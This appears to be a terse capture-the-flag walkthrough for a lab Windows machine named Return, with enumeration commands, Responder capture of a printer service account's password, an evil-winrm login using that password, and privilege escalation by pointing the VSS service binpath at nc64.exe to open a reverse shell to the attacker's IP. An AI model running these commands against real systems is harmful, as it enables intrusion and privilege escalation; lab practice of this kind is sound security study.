
```shell
ldapsearch -H ldap://10.129.95.241 -x -b "DC=RETURN,DC=LOCAL"
```

![[Pasted image 20240522155139.png]]

```shell
smbclient -N -L \\\\10.129.95.241 
```

![[Pasted image 20240522155234.png]]



![[Pasted image 20240522155309.png]]

```shell
sudo responder -I tun0
```
![[Pasted image 20240522155348.png]]

Change the Server Address to the attack machine's IP address and hit update:

![[Pasted image 20240522155502.png]]

The cleartext password will come in on the `Reponder` instance.

![[Pasted image 20240522155443.png]]

Use `evil-winrm` to connect to the server using the `svc-printer` credentials:

```shell
evil-winrm -i 10.129.95.241 -u 'return\svc-printer'  -p '1edFg43012!!'
```

And then confirm the flag and privileges:

```
whoami
whoami /priv
ipconfig
type ..\Desktop\user.txt
```

![[Pasted image 20240522155937.png]]

![[Pasted image 20240522214110.png]]

![[Pasted image 20240522214200.png]]


```
copy \\10.10.14.45\hack\nc64.exe .
sc.exe query VSS
sc.exe config VSS binpath="C:\Users\svc-printer\Documents\nc64.exe -e cmd 10.10.14.45 443"
sc.exe start VSS
```
![[Pasted image 20240522223009.png]]

![[Pasted image 20240522223313.png]]

